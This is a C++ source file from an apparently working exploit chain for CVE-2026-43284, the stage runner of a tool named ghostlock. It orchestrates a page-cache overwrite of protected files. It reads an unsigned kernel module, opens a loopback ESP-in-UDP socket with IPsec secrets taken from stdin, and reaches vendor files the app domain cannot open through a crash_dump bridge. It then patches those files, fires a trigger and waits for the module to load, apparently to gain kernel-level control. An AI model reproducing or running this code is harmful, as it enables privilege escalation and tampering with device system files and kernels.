/* B5-9c staged execution entry -- implementation. See stage_runner.hpp. */

#include "backend/cve_2026_43284/stage_runner.hpp"

#include "backend/cve_2026_43284/session_frame.hpp"
#include "support/run_state.hpp"

#include <cstdio>
#include <cstring>
#include <limits>
#include <string>
#include <string_view>

#if defined(__linux__)
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#endif

namespace ghostlock::backend::cve_2026_43284::stage_runner {
    namespace {
        constexpr std::uint64_t kMinModuleBytes = 64U;
        constexpr std::uint64_t kMaxModuleBytes = std::uint64_t{64} * 1024U * 1024U;

        char bool_digit(bool value) noexcept { return value ? '1' : '0'; }

        void append_event(std::string &out, std::string_view step,
                          std::string_view status) {
            out += ghostlock::support::run_state::format_event(step, status);
        }

        void append_bool(std::string &out, bool value) { out.push_back(bool_digit(value)); }

        void emit(const std::string &text) {
            if (!text.empty()) {
                (void)std::fwrite(text.data(), 1U, text.size(), stdout);
                (void)std::fflush(stdout);
            }
        }

        /* Fills the run.target diagnostics from a plan: the span that the valid
         * regions cover and whether any of them asks for a pre-image check.
         * Malformed or overflowing regions are skipped here; the closure check
         * rejects the plan separately. */
        void fill_plan_diagnostics(const steps::PatchPlan &plan,
                                   StageReport &report) noexcept {
            if (plan.regions == nullptr) {
                return;
            }
            bool any = false;
            std::uint64_t min_offset = std::numeric_limits<std::uint64_t>::max();
            std::uint64_t max_end = 0U;
            for (std::size_t i = 0U; i < plan.region_count; ++i) {
                const steps::PatchRegion &region = plan.regions[i];
                if (region.bytes == nullptr || region.len == 0U ||
                    region.offset >
                            std::numeric_limits<std::uint64_t>::max() - region.len) {
                    continue;
                }
                const std::uint64_t end =
                        region.offset + static_cast<std::uint64_t>(region.len);
                if (region.offset < min_offset) {
                    min_offset = region.offset;
                }
                if (end > max_end) {
                    max_end = end;
                }
                any = true;
            }
            if (any) {
                report.plan_offset = min_offset;
                report.plan_len = max_end - min_offset;
            }
        }

        /* Maps a chain failure onto the staged vocabulary. TargetOutOfBounds and
         * PreImageMismatch are fail-closed pre-write assertions and stay
         * distinct from the generic write rejection. */
        [[nodiscard]] StageError stage_error_from_chain(steps::ChainError error,
                                                        bool wrote) noexcept {
            switch (error) {
                case steps::ChainError::None:
                    return wrote ? StageError::None : StageError::WriteRejected;
                case steps::ChainError::TargetOutOfBounds:
                    return StageError::TargetOutOfBounds;
                case steps::ChainError::PreImageMismatch:
                    return StageError::PreImageMismatch;
                default:
                    return StageError::WriteRejected;
            }
        }

#if defined(__linux__)
        /* Creates the connected ESP-in-UDP sender socket from the session SA:
         * bind 127.0.0.1:sender_port, connect 127.0.0.1:encap_port. Returns the
         * fd, or a negative -errno. */
        int connect_esp_socket(const IpsecSaParams &sa) noexcept {
            const int fd = ::socket(AF_INET, SOCK_DGRAM, 0);
            if (fd < 0) {
                return -errno;
            }
            int opt = 1;
            (void)::setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt,
                               static_cast<socklen_t>(sizeof(opt)));
            sockaddr_in source{};
            source.sin_family = AF_INET;
            source.sin_port = htons(sa.sender_port);
            source.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (::bind(fd, reinterpret_cast<sockaddr *>(&source),
                       static_cast<socklen_t>(sizeof(source))) < 0) {
                const int saved = errno;
                (void)::close(fd);
                return -saved;
            }
            sockaddr_in destination{};
            destination.sin_family = AF_INET;
            destination.sin_port = htons(sa.encap_port);
            destination.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
            if (::connect(fd, reinterpret_cast<sockaddr *>(&destination),
                          static_cast<socklen_t>(sizeof(destination))) < 0) {
                const int saved = errno;
                (void)::close(fd);
                return -saved;
            }
            return fd;
        }
#endif
    } // namespace

    std::string_view stage_name(Stage stage) noexcept {
        switch (stage) {
            case Stage::Plan: return "plan";
            case Stage::Write: return "write";
            case Stage::Trigger: return "trigger";
            case Stage::Full: return "full";
        }
        return "unknown";
    }

    bool parse_stage(std::string_view text, Stage &out) noexcept {
        if (text == "plan") {
            out = Stage::Plan;
        } else if (text == "write") {
            out = Stage::Write;
        } else if (text == "trigger") {
            out = Stage::Trigger;
        } else if (text == "full") {
            out = Stage::Full;
        } else {
            return false;
        }
        return true;
    }

    std::string_view stage_error_name(StageError error) noexcept {
        switch (error) {
            case StageError::None: return "None";
            case StageError::InvalidArgument: return "InvalidArgument";
            case StageError::ModuleReadFailed: return "ModuleReadFailed";
            case StageError::ModulePrecheckFailed: return "ModulePrecheckFailed";
            case StageError::PlanInvalid: return "PlanInvalid";
            case StageError::TargetOutOfBounds: return "TargetOutOfBounds";
            case StageError::PreImageMismatch: return "PreImageMismatch";
            case StageError::NotReady: return "NotReady";
            case StageError::SessionRejected: return "SessionRejected";
            case StageError::WriteRejected: return "WriteRejected";
            case StageError::TriggerRejected: return "TriggerRejected";
            case StageError::WaitRejected: return "WaitRejected";
            case StageError::KsudFailed: return "KsudFailed";
            case StageError::CleanupRejected: return "CleanupRejected";
        }
        return "Unknown";
    }

    bool build_module_plan(std::string_view module_path, PlanBuffer &out,
                           StageError &error) {
        out = PlanBuffer{};
        error = StageError::None;
        if (module_path.empty()) {
            error = StageError::InvalidArgument;
            return false;
        }
        const std::string path(module_path);
        std::FILE *file = std::fopen(path.c_str(), "rb");
        if (file == nullptr) {
            error = StageError::ModuleReadFailed;
            return false;
        }
        if (std::fseek(file, 0, SEEK_END) != 0) {
            (void)std::fclose(file);
            error = StageError::ModuleReadFailed;
            return false;
        }
        const long size = std::ftell(file);
        if (size < 0 || static_cast<std::uint64_t>(size) < kMinModuleBytes ||
            static_cast<std::uint64_t>(size) > kMaxModuleBytes) {
            (void)std::fclose(file);
            error = StageError::ModuleReadFailed;
            return false;
        }
        if (std::fseek(file, 0, SEEK_SET) != 0) {
            (void)std::fclose(file);
            error = StageError::ModuleReadFailed;
            return false;
        }
        const std::uint64_t module_bytes = static_cast<std::uint64_t>(size);
        const std::uint64_t padded = ((module_bytes + 15U) / 16U) * 16U;
        out.bytes.assign(static_cast<std::size_t>(padded), 0U);
        const std::size_t read =
                std::fread(out.bytes.data(), 1U, static_cast<std::size_t>(module_bytes),
                           file);
        (void)std::fclose(file);
        if (read != static_cast<std::size_t>(module_bytes)) {
            out = PlanBuffer{};
            error = StageError::ModuleReadFailed;
            return false;
        }
        out.module_bytes = module_bytes;
        out.blocks = static_cast<std::uint32_t>(padded / 16U);
        out.region.offset = 0U;
        out.region.bytes = out.bytes.data();
        out.region.len = static_cast<std::size_t>(padded);
        out.region.verify = true;
        out.region.rollback = true;
        out.region.label = "module";
        out.plan.regions = &out.region;
        out.plan.region_count = 1U;
        /* The plan declares its own extent so the closure assert can bound it
         * even before a carrier size is known. */
        out.plan.extent = padded;
        return true;
    }

    bool precheck_staged_module(std::string_view module_path,
                                std::string_view release, lkm::ModuleFacts &facts,
                                lkm::LkmImageError &error) noexcept {
        facts = lkm::ModuleFacts{};
        error = lkm::LkmImageError::None;
        if (module_path.empty() || release.empty()) {
            error = lkm::LkmImageError::ReadFailed;
            return false;
        }
        lkm::KernelRelease parsed{};
        if (!lkm::parse_kernel_release(release, parsed)) {
            error = lkm::LkmImageError::ReadFailed;
            return false;
        }
        return lkm::precheck_module_file(module_path, parsed, facts, error);
    }

    StageReport run_stage(Stage stage, const steps::ChainRequest &request,
                          const steps::ChainOps &ops,
                          steps::ChainWorkspace &workspace) noexcept {
        StageReport report{};
        report.stage = stage;
        report.dev_target = request.allow_dev_carrier_path;
        report.target_size = request.target_size;
        fill_plan_diagnostics(request.plan, report);

        /* Static plan closure (structure, declared extent, target-file size and
         * mutual overlap) is asserted before any op is bound, for every stage
         * including plan. run_chain() re-checks it before writing. */
        const steps::ChainError closure =
                steps::validate_plan_closure(request.plan, 0U, request.target_size);
        if (closure != steps::ChainError::None) {
            report.error = closure == steps::ChainError::TargetOutOfBounds
                                   ? StageError::TargetOutOfBounds
                                   : StageError::PlanInvalid;
            return report;
        }
        if (stage == Stage::Plan) {
            return report;
        }

        steps::ChainRequest local = request;
        local.stop_after = stage == Stage::Write ? steps::ChainStopAfter::Write
                                                 : steps::ChainStopAfter::Full;
        report.chain = steps::run_chain(local, ops, workspace);
        report.wrote = report.chain.blocks_written != 0U;
        report.verified = report.wrote &&
                          report.chain.blocks_verified == report.chain.blocks_written;
        report.triggered = (stage == Stage::Trigger || stage == Stage::Full) &&
                           report.wrote &&
                           report.chain.error != steps::ChainError::TriggerFailed;
        report.terminus = report.chain.lkm_loaded;
        report.wait_incomplete =
                report.chain.error == steps::ChainError::WaitTimeout ||
                report.chain.error == steps::ChainError::LkmFailed;
        report.preimage_ok = report.chain.preimage_checked;

        switch (stage) {
            case Stage::Plan:
                break;
            case Stage::Write:
                report.error = stage_error_from_chain(report.chain.error,
                                                      report.wrote);
                break;
            case Stage::Trigger:
            case Stage::Full:
                /* Upstream nativeRunAll rc semantics: a verified patch plus a
                 * fired sentry is not enough; the terminus outcome decides.
                 * Success 0, ksud marker failure 1, timeout 2, everything else
                 * (patch/write/trigger) 3. Trigger and full share the rule. */
                if (report.chain.error == steps::ChainError::None &&
                    report.terminus) {
                    report.error = StageError::None;
                } else if (report.chain.error == steps::ChainError::LkmFailed) {
                    report.error = StageError::KsudFailed;
                } else if (report.chain.error == steps::ChainError::WaitTimeout) {
                    report.error = StageError::WaitRejected;
                } else if (report.chain.error == steps::ChainError::TriggerFailed) {
                    report.error = StageError::TriggerRejected;
                } else if (report.chain.error ==
                           steps::ChainError::TargetOutOfBounds) {
                    report.error = StageError::TargetOutOfBounds;
                } else if (report.chain.error == steps::ChainError::PreImageMismatch) {
                    report.error = StageError::PreImageMismatch;
                } else {
                    report.error = StageError::WriteRejected;
                }
                break;
        }
        if (report.error == StageError::None && !report.chain.cleanup_ran) {
            report.error = StageError::CleanupRejected;
        }
        return report;
    }

    std::string format_stage_report(const StageReport &report,
                                    std::string_view module_path,
                                    std::string_view target_path,
                                    std::uint64_t module_bytes) {
        std::string out;
        out.reserve(1024U);

        {
            std::string status("stage=");
            status += stage_name(report.stage);
            append_event(out, "run.cve_2026_43284", status);
        }
        {
            std::string status("path=");
            status += module_path.empty() ? std::string_view("-") : module_path;
            status += " bytes=";
            status += std::to_string(module_bytes);
            status += " wrote=";
            append_bool(status, report.wrote);
            status += " verified=";
            append_bool(status, report.verified);
            append_event(out, "run.module", status);
        }
        {
            /* Write-location diagnostics: the target size the boundary assert
             * used, the plan span and whether a declared pre-image was
             * verified against the target. */
            std::string status("path=");
            status += target_path.empty() ? std::string_view("-") : target_path;
            status += " size=";
            status += std::to_string(report.target_size);
            status += " offset=";
            status += std::to_string(report.plan_offset);
            status += " len=";
            status += std::to_string(report.plan_len);
            status += " preimage=";
            status += report.preimage_ok ? "ok" : "absent";
            append_event(out, "run.target", status);
        }
        {
            /* Explicit misuse guard: the dev-only non-vendor carrier hatch is
             * always visible in the records. */
            append_event(out, "run.dev_target",
                         report.dev_target ? "allow=1" : "allow=0");
        }
        if (report.stage != Stage::Plan) {
            const steps::ChainResult &chain = report.chain;
            std::string status("written=");
            status += std::to_string(chain.blocks_written);
            status += " verified=";
            status += std::to_string(chain.blocks_verified);
            status += " rolled_back=";
            status += std::to_string(chain.blocks_rolled_back);
            status += " cleanup=";
            append_bool(status, chain.cleanup_ran);
            status += " journal_overflow=";
            append_bool(status, chain.journal_overflow);
            status += " rollback_incomplete=";
            append_bool(status, chain.rollback_incomplete);
            status += " crash_dump=";
            append_bool(status, chain.crash_dump_patched);
            status += " hook=";
            append_bool(status, chain.hook_applied);
            status += " hook_restored=";
            append_bool(status, chain.hook_restored);
            append_event(out, "run.chain", status);

            if (report.stage == Stage::Trigger || report.stage == Stage::Full) {
                std::string trigger("fired=");
                append_bool(trigger, report.triggered);
                trigger += " wait_incomplete=";
                append_bool(trigger, report.wait_incomplete);
                append_event(out, "run.trigger", trigger);

                std::string wait("outcome=");
                wait += chain_wait_name(chain.wait);
                wait += " terminus=";
                append_bool(wait, report.terminus);
                wait += " error=";
                wait += chain_error_name(chain.error);
                append_event(out, "run.wait", wait);
            }
        }
        {
            std::string status;
            if (report.error == StageError::None) {
                status = "ok error=None";
            } else {
                status = "failed error=";
                status += stage_error_name(report.error);
            }
            append_event(out, "run.cve_2026_43284", status);
        }
        return out;
    }

    int stage_exit_code(const StageReport &report) noexcept {
        /* trigger/full: upstream nativeRunAll rc (0 ok / 1 ksud failed /
         * 2 timeout / 3 patch). */
        if (report.stage == Stage::Trigger || report.stage == Stage::Full) {
            switch (report.error) {
                case StageError::None: return 0;
                case StageError::KsudFailed: return 1;
                case StageError::WaitRejected: return 2;
                default: return 3;
            }
        }
        switch (report.error) {
            case StageError::None: return 0;
            case StageError::WriteRejected: return 3;
            case StageError::TriggerRejected: return 4;
            case StageError::WaitRejected: return 5;
            case StageError::CleanupRejected: return 6;
            case StageError::InvalidArgument:
            case StageError::ModuleReadFailed:
            case StageError::ModulePrecheckFailed:
            case StageError::PlanInvalid:
            case StageError::TargetOutOfBounds:
            case StageError::PreImageMismatch:
            case StageError::NotReady:
            case StageError::SessionRejected:
            case StageError::KsudFailed:
                return 2;
        }
        return 2;
    }

    int run_stage_cli(std::string_view module_path, std::string_view target_path,
                      Stage stage, bool allow_dev_target) {
        if (module_path.empty() || target_path.empty()) {
            return 1;
        }

        PlanBuffer plan{};
        StageError plan_error = StageError::None;
        if (!build_module_plan(module_path, plan, plan_error)) {
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = plan_error;
            emit(format_stage_report(report, module_path, target_path, 0U));
            return stage_exit_code(report);
        }

        steps::CarrierTarget carrier{};
        carrier.path = target_path;
        carrier.size = 0U;
        steps::ChainRequest request{};
        request.carriers = &carrier;
        request.carrier_count = 1U;
        request.plan = plan.plan;
        request.wait_timeout_ms = 5000U;
        request.allow_dev_carrier_path = allow_dev_target;

        if (stage == Stage::Plan) {
            /* No device binding and no write: the plan is validated and printed. */
            steps::ChainOps ops{};
            steps::ChainWorkspace workspace{};
            const StageReport report = run_stage(stage, request, ops, workspace);
            emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
            return stage_exit_code(report);
        }

#if !defined(__linux__)
        StageReport report{};
        report.stage = stage;
        report.dev_target = allow_dev_target;
        report.error = StageError::NotReady;
        emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
        return stage_exit_code(report);
#else
        /* B5-4 fail-closed precheck before patch #2: the .ko must match the
         * running KMI (ELF/.modinfo name, vermagic, empty __versions, unsigned).
         * No module is loaded here. */
        {
            char release_buf[platform::kDeviceReleaseMax] = {};
            const platform::DeviceProbeOps probe = platform::real_device_probe();
            long release_len = -1;
            if (probe.read_release != nullptr) {
                release_len = probe.read_release(probe.ctx, release_buf,
                                                 sizeof(release_buf));
            }
            const std::string_view release =
                    release_len > 0
                            ? std::string_view(release_buf,
                                               static_cast<std::size_t>(release_len))
                            : std::string_view{};
            lkm::ModuleFacts facts{};
            lkm::LkmImageError lkm_error = lkm::LkmImageError::None;
            if (!precheck_staged_module(module_path, release, facts, lkm_error)) {
                StageReport report{};
                report.stage = stage;
                report.dev_target = allow_dev_target;
                report.error = StageError::ModulePrecheckFailed;
                emit(format_stage_report(report, module_path, target_path,
                                         plan.module_bytes));
                return stage_exit_code(report);
            }
        }

        ScopedIpsecSaParams secrets{};
        const SessionFrameStatus frame =
                read_session_secret_frame(STDIN_FILENO, &secrets.value);
        if (frame != SessionFrameStatus::Ok) {
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = StageError::SessionRejected;
            emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
            return stage_exit_code(report);
        }

        const std::string target(target_path);
        const int target_fd = ::open(target.c_str(), O_RDONLY | O_CLOEXEC);

        /* Boundary surface: the real target size from fstat(2), asserted against
         * every planned region before a byte is written. A target the App could
         * not open (vendor helper carrier) stays 0 == unknown and relies on the
         * carrier's declared size. */
        std::uint64_t target_size = 0U;
        if (target_fd >= 0) {
            struct stat st{};
            if (::fstat(target_fd, &st) == 0 && st.st_size > 0) {
                target_size = static_cast<std::uint64_t>(st.st_size);
            }
        }
        request.target_size = target_size;

        RealChainContext ctx{};
        ctx.page.sa = secrets.value;
        ctx.page.io = pagecache::real_splice_io();
        ctx.device = platform::real_device_probe();
        ctx.trigger_delay_ms = 500U;
        ctx.target_path = target.c_str();
        ctx.allow_dev_carrier_path = allow_dev_target;
        ctx.bridge = steps::real_crash_dump_bridge();

        /* Direct fd preferred. A vendor target the App/shell domain cannot open
         * at all (open() failed, so file_fd stays -1) is still reachable: the
         * crash_dump read bridge supplies the old block and the patched helper
         * splices the target page into the write pipe (exp.c patch_file_cbc
         * use_helper=1). The dev-only target cannot use the bridge, and any
         * other open failure stays fatal. */
        const bool helper_carrier =
                target_fd < 0 && !allow_dev_target && ctx.bridge.available() &&
                steps::is_vendor_path(target);
        if (target_fd < 0 && !helper_carrier) {
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = StageError::InvalidArgument;
            emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
            return stage_exit_code(report);
        }

        ctx.page.file_fd = target_fd;
        ctx.page.socket_fd = connect_esp_socket(secrets.value);
        if (!allow_dev_target) {
            /* patch #1 target: app-readable in the untrusted_app domain. */
            ctx.crash_dump_fd =
                    ::open(steps::kCrashDump64Path, O_RDONLY | O_CLOEXEC);
        }

        if (ctx.page.socket_fd < 0) {
            if (target_fd >= 0) {
                (void)::close(target_fd);
            }
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = StageError::NotReady;
            emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
            return stage_exit_code(report);
        }

        if (!ctx.run_ready()) {
            real_chain_release(&ctx.page);
            StageReport report{};
            report.stage = stage;
            report.dev_target = allow_dev_target;
            report.error = StageError::NotReady;
            emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
            return stage_exit_code(report);
        }

        const steps::ChainOps ops = make_real_chain_ops(ctx);
        steps::ChainWorkspace workspace{};
        const StageReport report = run_stage(stage, request, ops, workspace);
        if (!ctx.released) {
            /* A pre-chain rejection left the fds open; close them fail-closed. */
            real_chain_release(&ctx.page);
        }
        emit(format_stage_report(report, module_path, target_path, plan.module_bytes));
        return stage_exit_code(report);
#endif
    }
} // namespace ghostlock::backend::cve_2026_43284::stage_runner
